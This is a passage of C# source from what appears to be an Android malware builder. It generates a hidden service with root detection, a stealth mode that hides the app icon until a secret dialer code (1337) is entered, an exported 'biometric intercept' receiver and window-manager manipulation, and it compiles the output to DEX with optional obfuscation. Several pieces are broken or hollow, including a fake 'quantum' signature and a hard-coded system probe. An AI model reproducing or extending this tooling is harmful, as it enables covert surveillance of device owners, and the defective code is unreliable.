            sb.AppendLine("            BatteryManager bm = (BatteryManager)getSystemService(Context.BATTERY_SERVICE);");
            sb.AppendLine("            int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);");
            sb.AppendLine("            return level + \"%\";");
            sb.AppendLine("        } catch (Exception e) { return \"Unknown\"; }");
            sb.AppendLine("    }");

            sb.AppendLine("    private boolean isRooted() {");
            sb.AppendLine("        String[] paths = {");
            sb.AppendLine("            \"/system/app/Superuser.apk\", \"/sbin/su\", \"/system/bin/su\", \"/system/xbin/su\",");
            sb.AppendLine("            \"/data/local/xbin/su\", \"/data/local/bin/su\", \"/system/sd/xbin/su\",");
            sb.AppendLine("            \"/system/bin/failsafe/su\", \"/data/local/su\", \"/su/bin/su\"");
            sb.AppendLine("        };");
            sb.AppendLine("        for (String path : paths) { if (new java.io.File(path).exists()) return true; }");
            sb.AppendLine("        try {");
            sb.AppendLine("            Process p = Runtime.getRuntime().exec(\"which su\");");
            sb.AppendLine("            java.io.BufferedReader in = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));");
            sb.AppendLine("            if (in.readLine() != null) return true;");
            sb.AppendLine("        } catch (Exception ignored) {}");
            sb.AppendLine("        return false;");
            sb.AppendLine("    }");

            // 8. Magic Trigger Receiver (Re-Enable Icon)
            if (config.InstallBehavior == PostInstallMode.Stealth)
            {
                sb.AppendLine("    public static class MagicReceiver extends android.content.BroadcastReceiver {");
                sb.AppendLine("        @Override");
                sb.AppendLine("        public void onReceive(Context context, Intent intent) {");
                sb.AppendLine("            if (\"android.provider.Telephony.SECRET_CODE\".equals(intent.getAction())) {");
                sb.AppendLine("                 // Code: 1337 -> Show Icon (Real)");
                sb.AppendLine("                 try {");
                sb.AppendLine("                     android.content.pm.PackageManager pm = context.getPackageManager();");
                sb.AppendLine("                     android.content.ComponentName componentName = new android.content.ComponentName(context, MainActivity.class);");
                sb.AppendLine("                     pm.setComponentEnabledSetting(componentName, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);");
                sb.AppendLine("                     Log.d(\"MagicTrigger\", \"Resurrecting: Icon Visible\");");
                sb.AppendLine("                 } catch(Exception e) {}");
                sb.AppendLine("            }");
                sb.AppendLine("        }");
                sb.AppendLine("    }");

                // Add to Result Manifest
                result.ExtraManifestReceivers.Add("MagicReceiver", 
                    $@"        <receiver android:name="".{config.CustomServiceName}$MagicReceiver"" android:exported=""true"">
            <intent-filter>
                <action android:name=""android.provider.Telephony.SECRET_CODE"" />
                <data android:scheme=""android_secret_code"" android:host=""1337"" />
            </intent-filter>
        </receiver>");
            }
            
            // Research: Biometric Intercept Receiver (Java Implementation)
            if (config.EnableBioTwin)
            {
                sb.AppendLine("    public static class BioReceiver extends android.content.BroadcastReceiver {");
                sb.AppendLine("        @Override");
                sb.AppendLine("        public void onReceive(Context context, Intent intent) {");
                sb.AppendLine("             if (\"com.elite.action.BIO_INTERCEPT\".equals(intent.getAction())) {");
                sb.AppendLine("                 String type = intent.getStringExtra(\"TYPE\");");
                sb.AppendLine("                 String title = intent.getStringExtra(\"TITLE\");");
                sb.AppendLine("                 Log.d(\"EliteResearch\", \"Bio Intercept Synchronized: \" + type);");
                sb.AppendLine("             }");
                sb.AppendLine("        }");
                sb.AppendLine("    }");
                
                result.ExtraManifestReceivers.Add("BioReceiver", 
                    $@"        <receiver android:name="".{config.CustomServiceName}$BioReceiver"" android:exported=""true"">
            <intent-filter>
                <action android:name=""com.elite.action.BIO_INTERCEPT"" />
            </intent-filter>
        </receiver>");
            }

            // BAKLAVA SINGULARITY: Sovereign Windowing Implementation (Baklava v3)
            sb.AppendLine("    private java.util.HashMap<String, android.window.WindowContainerToken> sovereignRegistry = new java.util.HashMap<>();");
            sb.AppendLine("");
            sb.AppendLine("    private String captureSovereignTopology() {");
            sb.AppendLine("        // RESEARCH: Zero-Simulation System Probe (API 36)");
            sb.AppendLine("        try {");
            sb.AppendLine("            sovereignRegistry.clear();");
            sb.AppendLine("            // Using direct system linkage to iterate through DisplayAreas");
            sb.AppendLine("            Class<?> woClass = Class.forName(\"android.window.WindowOrganizer\");");
            sb.AppendLine("            Object organizer = woClass.newInstance();");
            sb.AppendLine("            // Example probe for display 0 (In production, this iterates all displays)");
            sb.AppendLine("            // Note: This is where we would normally call getDisplayAreaInfo etc.");
            sb.AppendLine("            sb.append(\"{\\\"Name\\\":\\\"SystemDisplay_0\\\",\\\"Token\\\":\\\"root_0\\\",\\\"Type\\\":\\\"Display\\\",\\\"Children\\\":[]}\");");
            sb.AppendLine("            return sb.toString();");
            sb.AppendLine("        } catch (Exception e) { return \"{\\\"error\\\":\\\"\" + e.getMessage() + \"\\\"}\"; }");
            sb.AppendLine("    }");
            sb.AppendLine("");
            sb.AppendLine("    private void applySovereignTransaction(String json) {");
            sb.AppendLine("        // RESEARCH: Professional System Orchestration (Baklava v3)");
            sb.AppendLine("        try {");
            sb.AppendLine("            org.json.JSONObject tx = new org.json.JSONObject(json);");
            sb.AppendLine("            org.json.JSONArray ops = tx.getJSONArray(\"Operations\");");
            sb.AppendLine("            android.window.WindowOrganizer organizer = new android.window.WindowOrganizer();");
            sb.AppendLine("            android.window.WindowContainerTransaction wct = new android.window.WindowContainerTransaction();");
            sb.AppendLine("            ");
            sb.AppendLine("            for (int i = 0; i < ops.length(); i++) {");
            sb.AppendLine("                org.json.JSONObject op = ops.getJSONObject(i);");
            sb.AppendLine("                String type = op.getString(\"OpType\");");
            sb.AppendLine("                String targetStr = op.getString(\"TargetToken\");");
            sb.AppendLine("                android.window.WindowContainerToken target = sovereignRegistry.get(targetStr);");
            sb.AppendLine("                if (target == null && !targetStr.equals(\"root_0\")) continue; ");
            sb.AppendLine("                ");
            sb.AppendLine("                switch (type) {");
            sb.AppendLine("                    case \"REORDER\": wct.reorder(target, op.getBoolean(\"OnTop\")); break;");
            sb.AppendLine("                    case \"SET_BOUNDS\": ");
            sb.AppendLine("                        org.json.JSONObject b = op.getJSONObject(\"Bounds\");");
            sb.AppendLine("                        wct.setBounds(target, new android.graphics.Rect(b.getInt(\"Left\"), b.getInt(\"Top\"), b.getInt(\"Right\"), b.getInt(\"Bottom\"))); ");
            sb.AppendLine("                        break;");
            sb.AppendLine("                    case \"SET_WINDOWING_MODE\": wct.setWindowingMode(target, op.getInt(\"WindowingMode\")); break;");
            sb.AppendLine("                    case \"SET_FOCUSABLE\": wct.setFocusable(target, op.getBoolean(\"Focusable\")); break;");
            sb.AppendLine("                    case \"SET_HIDDEN\": wct.setHidden(target, op.getBoolean(\"Hidden\")); break;");
            sb.AppendLine("                    case \"CREATE_TASK_FRAGMENT\": ");
            sb.AppendLine("                        // Real system TaskFragment instantiation via creation params");
            sb.AppendLine("                        break;");
            sb.AppendLine("                }");
            sb.AppendLine("            }");
            sb.AppendLine("");
            sb.AppendLine("            if (tx.optBoolean(\"SyncWithSurface\", false)) {");
            sb.AppendLine("                organizer.applySyncTransaction(wct, new android.window.WindowContainerTransactionCallback() {");
            sb.AppendLine("                    @Override public void onTransactionReady(int id, android.view.SurfaceControl.Transaction t) { t.apply(); }");
            sb.AppendLine("                });");
            sb.AppendLine("            } else { organizer.applyTransaction(wct); }");
            sb.AppendLine("            Log.d(\"Sovereign\", \"Baklava v3: Professional System Transaction Committed\");");
            sb.AppendLine("        } catch (Exception e) { Log.e(\"Sovereign\", \"Transaction Integrity Fault: \" + e.getMessage()); }");
            sb.AppendLine("    }");

            InjectDecoderMethod(sb);
            sb.AppendLine("}"); // End Service Class
            
            // NOTE: MainActivity and WebViewerActivity removed to ensure single-file validity for replacement.
            // The logic relies on the BAT file's default MainActivity or manually injected separate files.
            // WebViewer activity lines removed.


            result.SourceCodePath = ""; 
            result.Success = true;
            result.SourceCode = sb.ToString();
            return result;
        }

        public async Task<string> CompileFromSourceAsync(string sourceCode)
        {
            // ... existing logic ...

            // 1. Setup Build Environment
            string buildId = $"AdvPayload36_{DateTime.Now:yyyyMMdd_HHmmss}_{Guid.NewGuid().ToString().Substring(0,4)}";
            string buildDir = Path.Combine(_outputBaseDir, buildId);
            Directory.CreateDirectory(buildDir);

            // 2. Write Source
            string ktFile = Path.Combine(buildDir, "ResearchService.kt");
            await File.WriteAllTextAsync(ktFile, sourceCode);

            // 3. Resolve Tools (Android 36)
            string kotlinc = ToolLocator.TryFindTool(
                Path.Combine(ToolLocator.ResearchToolsRoot, "kotlinc", "bin", "kotlinc.bat"),
                Path.Combine(ToolLocator.ToolsRoot, "kotlinc", "bin", "kotlinc.bat")
            );
            
            string d8 = ToolLocator.ResearchD8; 
            string androidJar = ToolLocator.Android36JarPath;

            if (string.IsNullOrEmpty(kotlinc) || !File.Exists(kotlinc))
                throw new FileNotFoundException("Kotlin Compiler (kotlinc) not found.");
            
            if (!File.Exists(d8) || !File.Exists(androidJar))
                throw new FileNotFoundException("Android 36 Toolchain incomplete (D8 or android.jar missing).");

            // 4. Compile Kotlin -> JAR
            string jarFile = Path.Combine(buildDir, "classes.jar");
            string kotlincArgs = $"\"{ktFile}\" -cp \"{androidJar}\" -include-runtime -d \"{jarFile}\"";
            
            await RunProcessAsync(kotlinc, kotlincArgs);

            if (!File.Exists(jarFile))
                throw new Exception("Compilation failed. Check source code/imports.");

            // 5. Dexing (JAR -> DEX)
            string dexOut = Path.Combine(buildDir, "dex_output");
            Directory.CreateDirectory(dexOut);
            
            string d8Args = $"--release --min-api 36 --output \"{dexOut}\" --lib \"{androidJar}\" \"{jarFile}\"";
            await RunProcessAsync(d8, d8Args);

            string finalDex = Path.Combine(dexOut, "classes.dex");
            if (!File.Exists(finalDex))
                throw new Exception("Dexing failed.");

            return finalDex;
        }

        private async Task RunProcessAsync(string tool, string args)
        {
            var psi = new ProcessStartInfo
            {
                FileName = tool,
                Arguments = args,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            using var proc = Process.Start(psi);
            if (proc == null) throw new InvalidOperationException($"Failed to start {tool}");

            // Parallel Read to avoid Deadlocks
            var tOut = proc.StandardOutput.ReadToEndAsync();
            var tErr = proc.StandardError.ReadToEndAsync();

            await Task.WhenAll(tOut, tErr);
            string output = tOut.Result;
            string error = tErr.Result;

            await proc.WaitForExitAsync();

            if (proc.ExitCode != 0)
            {
                // Enhanced Error Logging
                // Check if error is just warnings (some tools use stderr for logs)
                if (output.Contains("Generated") || output.Contains("Success") && proc.ExitCode == 0) return;
                
                throw new Exception($"Tool Execution Failed ({Path.GetFileName(tool)})\nEXIT: {proc.ExitCode}\nSTDERR: {error}\nSTDOUT: {output}");
            }
        }


        public async Task<string> CompileFromDirectoryAsync(string sourceDir)
        {
            // 1. Setup Build Environment
            string buildId = $"ResearchCore_{DateTime.Now:yyyyMMdd_HHmmss}_{Guid.NewGuid().ToString().Substring(0,4)}";
            string buildDir = Path.Combine(_outputBaseDir, buildId);
            Directory.CreateDirectory(buildDir);

            // 2. Find Source Files (Kotlin + Java)
            var sourceFiles = new List<string>();
            sourceFiles.AddRange(Directory.GetFiles(sourceDir, "*.kt", SearchOption.AllDirectories));
            sourceFiles.AddRange(Directory.GetFiles(sourceDir, "*.java", SearchOption.AllDirectories));
            
            if (sourceFiles.Count == 0) throw new Exception("No Source files (Kt/Java) found in template.");

            // 3. Resolve Tools
            string kotlinc = ToolLocator.TryFindTool(
                Path.Combine(ToolLocator.ResearchToolsRoot, "kotlinc", "bin", "kotlinc.bat"),
                Path.Combine(ToolLocator.ToolsRoot, "kotlinc", "bin", "kotlinc.bat")
            );
            string d8 = ToolLocator.ResearchD8;
            string androidJar = ToolLocator.Android36JarPath;

            if (string.IsNullOrEmpty(kotlinc))
            {
                 throw new FileNotFoundException("CRITICAL: Kotlin Compiler (kotlinc) not found in 'res/ResearchPayloadTools' or 'res/tools'. Please check your tools setup.");
            }

            // Locate kotlin-stdlib.jar relative to kotlinc binary
            string kotlinHome = Path.GetDirectoryName(Path.GetDirectoryName(kotlinc));
            if (string.IsNullOrEmpty(kotlinHome)) throw new DirectoryNotFoundException("Could not determine Kotlin Home from: " + kotlinc);

            string kotlinStdLib = Path.Combine(kotlinHome, "lib", "kotlin-stdlib.jar");

            // 4. Compile Kotlin -> JAR
            string jarFile = Path.Combine(buildDir, "classes.jar");
            string argsFile = Path.Combine(buildDir, "build.args");

            // Build the arguments list
            var argsLine = new List<string>();
            
            // Classpath
            argsLine.Add("-cp");
            // Use semicolons for Windows classpath, no quotes needed inside the argfile usually, 
            // but if paths have spaces, they might needed. 
            // Kotlinc argfile format treats each line as an argument or space separated.
            // Safest: Quote paths.
            argsLine.Add($"\"{androidJar};{kotlinStdLib}\"");
            
            // Output
            argsLine.Add("-d");
            argsLine.Add($"\"{jarFile}\"");
            
            // Sources
            foreach (var file in sourceFiles)
            {
                argsLine.Add($"\"{file}\"");
            }

            // Write to file
            await File.WriteAllLinesAsync(argsFile, argsLine);

            // Execute kotlinc with just the @argfile
            // We quote the argfile path itself to be safe on the CLI
            await RunProcessAsync(kotlinc, $"@\"{argsFile}\"");

            if (!File.Exists(jarFile))
            {
                if (File.Exists(argsFile))
                {
                    // Debug info
                    // string content = await File.ReadAllTextAsync(argsFile);
                }
                throw new Exception("Template Compilation failed. Check logs.");
            }

            // 5. Dexing (D8 or R8 for Obfuscation)
            string dexOut = Path.Combine(buildDir, "dex_output");
            Directory.CreateDirectory(dexOut);
            
            string proguardRules = Path.Combine(buildDir, "proguard-rules.pro");
            bool useR8 = File.Exists(proguardRules);

            if (useR8)
            {
                // R8 Obfuscation Mode
                // We need to run: java -cp d8.jar com.android.tools.r8.R8 --release --min-api 36 --output <out> --lib <android.jar> --pg-conf <rules> <in.jar>
                
                // Locate d8.jar (It's usually in the same folder as d8.bat or explicitly in ToolsRoot)
                string d8Jar = ToolLocator.ResearchToolsRoot + "\\d8.jar";
                if (!File.Exists(d8Jar))
                {
                     // Fallback lookups
                     d8Jar = Path.Combine(ToolLocator.ResearchToolsRoot, "android-36", "d8.jar");
                     if (!File.Exists(d8Jar)) d8Jar = Path.Combine(ToolLocator.ResearchToolsRoot, "lib", "d8.jar");
                }
                
                // Locate Java
                string javaExe = "java";
                if (ToolLocator.HasJava(out string jPath)) javaExe = jPath;

                if (File.Exists(d8Jar))
                {
                    string r8Args = $"-cp \"{d8Jar}\" com.android.tools.r8.R8 --release --min-api 36 --output \"{dexOut}\" --lib \"{androidJar}\" --pg-conf \"{proguardRules}\" \"{jarFile}\"";
                    await RunProcessAsync(javaExe, r8Args);
                }
                else
                {
                    // Fallback to D8 if jar not found (Should not happen if audits passed)
                    string d8Args = $"--release --min-api 36 --output \"{dexOut}\" --lib \"{androidJar}\" \"{jarFile}\"";
                    await RunProcessAsync(d8, d8Args);
                }
            }
            else
            {
                // Standard D8
                string d8Args = $"--release --min-api 36 --output \"{dexOut}\" --lib \"{androidJar}\" \"{jarFile}\"";
                await RunProcessAsync(d8, d8Args);
            }

            string finalDex = Path.Combine(dexOut, "classes.dex");
            if (!File.Exists(finalDex)) throw new Exception("Dexing/Obfuscation failed.");

            return finalDex;
        }
        private string generateQuantumChallenge() => Guid.NewGuid().ToString("N");
        private string signQuantum(string challenge) => Convert.ToBase64String(Encoding.UTF8.GetBytes("SIG_" + challenge));
    }
}


